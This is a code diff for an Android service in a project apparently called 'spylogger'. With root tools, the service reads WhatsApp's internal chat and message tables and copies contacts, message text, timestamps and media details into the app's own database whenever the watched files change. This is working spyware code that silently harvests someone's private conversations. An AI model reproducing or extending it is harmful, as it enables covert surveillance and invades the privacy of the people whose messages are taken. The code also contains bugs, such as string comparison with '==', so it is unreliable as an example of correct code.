@@ -18,6 +18,7 @@ import com.gravatasufoca.spylogger.model.whatsapp.Messages;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.GenericRawResults;
+import com.j256.ormlite.stmt.QueryBuilder;
 import com.stericson.RootTools.RootTools;
 import com.stericson.RootTools.execution.CommandCapture;
 
@@ -91,57 +92,7 @@ public class WhatsAppService extends Service {
 
 		Log.d("WHATSLOG - FLAGS", Integer.toString(flags));
 
-		external = new DatabaseHelperExternal(getApplicationContext());
-		dbHelper = new DatabaseHelper((getApplicationContext()));
-
-		try {
-			daoMsgExternal = external.getMessagesDao();
-			daoChatExternal = external.getChatDao();
-
-			daoMsgExternal.executeRaw("attach database '"+inFileName+"' as 'localdb' ");
-
-
-			GenericRawResults<String[]> raws= daoMsgExternal.queryRaw("select _id,key_remote_jid, subject,creation,sort_timestamp from chat_list where _id!=-1 and _id not in( select idReferencia from localdb.topico )");
-			List<Topico> topicos=new ArrayList<>();
-
-			for(String[] resultRaw:raws){
-				Topico topico=new Topico.TopicoBuilder()
-						.setIdReferencia(resultRaw[0])
-						.setRemoteKey(resultRaw[1])
-						.setNome(resultRaw[2])
-						.setDataCriacao(new Date(Long.parseLong(resultRaw[3])))
-						.setOrdenacao(new Date(Long.parseLong(resultRaw[4]))).build();
-
-				topicos.add(topico);
-			}
-
-			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end from messages where _id!=-1 and _id not in( select idReferencia from localdb.mensagem )");
-			List<Mensagem> mensagems=new ArrayList<>();
-			for(final String[] resultRaw:rawResults){
-
-				for(Topico topico: topicos) {
-					if(topico.getRemoteKey().equals(resultRaw[1])) {
-						Mensagem mensagem = new Mensagem.MensagemBuilder()
-								.setIdReferencia(resultRaw[0])
-								.setRemoteKey(resultRaw[1])
-								.setRemetente(resultRaw[2] == "1")
-								.setTexto(resultRaw[3])
-								.setData(new Date(Long.parseLong(resultRaw[4])))
-								.setDataRecebida(new Date(Long.parseLong(resultRaw[8])))
-								.setTamanhoArquivo(Long.parseLong(resultRaw[6]))
-								.setTipoMidia(TipoMidia.getTipoMidia(resultRaw[5]))
-								.setContato(resultRaw[7])
-								.setTemMedia(resultRaw[9] == "1").build();
-						mensagems.add(mensagem);
-					}
-				}
-			}
-
-
-
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
+		updateMsg();
 
 		if(Utils.whatsObserver==null)
 			setObserver();
@@ -164,7 +115,6 @@ public class WhatsAppService extends Service {
 					Log.d("DEBUG", "MODIFY:" + pathToWatch + file);
 
 					updateMsg();
-					updateChat();
 					break;
 				default:
 					// just ignore
@@ -177,12 +127,70 @@ public class WhatsAppService extends Service {
 	}
 
 	private void updateMsg() {
+		external = new DatabaseHelperExternal(getApplicationContext());
+		dbHelper = new DatabaseHelper((getApplicationContext()));
 
+		try {
+			daoMsgExternal = external.getMessagesDao();
+			daoChatExternal = external.getChatDao();
+
+			daoMsgExternal.executeRaw("attach database '"+inFileName+"' as 'localdb' ");
+
+
+			GenericRawResults<String[]> raws= daoMsgExternal.queryRaw("select _id,key_remote_jid, subject,sort_timestamp from chat_list where _id!=-1 and _id not in( select idReferencia from localdb.topico )");
+			List<Topico> topicos=new ArrayList<>();
+
+			for(String[] resultRaw:raws){
+				Topico topico=new Topico.TopicoBuilder()
+						.setIdReferencia(resultRaw[0])
+						.setRemoteKey(resultRaw[1])
+						.setNome(resultRaw[2])
+						.setOrdenacao(new Date(Long.parseLong(resultRaw[3]))).build();
+
+				topicos.add(topico);
+			}
+			dbHelper.getTopicoDao().create(topicos);
+
+			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end from messages where _id!=-1 and _id not in( select idReferencia from localdb.mensagem )");
+			List<Mensagem> mensagems=new ArrayList<>();
+			for(final String[] resultRaw:rawResults){
+				Topico tmpTopico=null;
+				for(Topico topico: topicos) {
+					if(topico.getRemoteKey().equals(resultRaw[1])) {
+						tmpTopico=topico;
+						break;
+					}
+				}
+
+				Mensagem mensagem = new Mensagem.MensagemBuilder()
+						.setIdReferencia(resultRaw[0])
+						.setRemetente(resultRaw[2] == "1")
+						.setTexto(resultRaw[3])
+						.setData(new Date(Long.parseLong(resultRaw[4])))
+						.setDataRecebida(new Date(Long.parseLong(resultRaw[8])))
+						.setTamanhoArquivo(Long.parseLong(resultRaw[6]))
+						.setTipoMidia(TipoMidia.getTipoMidia(resultRaw[5]))
+						.setContato(resultRaw[7])
+						.setTopico(tmpTopico)
+						.setTemMedia(resultRaw[9] == "1").build();
+
+				if(tmpTopico==null){
+					QueryBuilder<Topico,Integer> qb=dbHelper.getTopicoDao().queryBuilder();
+					qb.where().eq("remoteKey",resultRaw[1]);
+					tmpTopico=dbHelper.getTopicoDao().queryForFirst(qb.prepare());
+					mensagem.setTopico(tmpTopico);
+				}
+				mensagems.add(mensagem);
+			}
+
+			mensagems.size();
+			dbHelper.getMensagemDao().create(mensagems);
+
+
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 
 	}
 
-	private void updateChat() {
-
-
-	}
 }
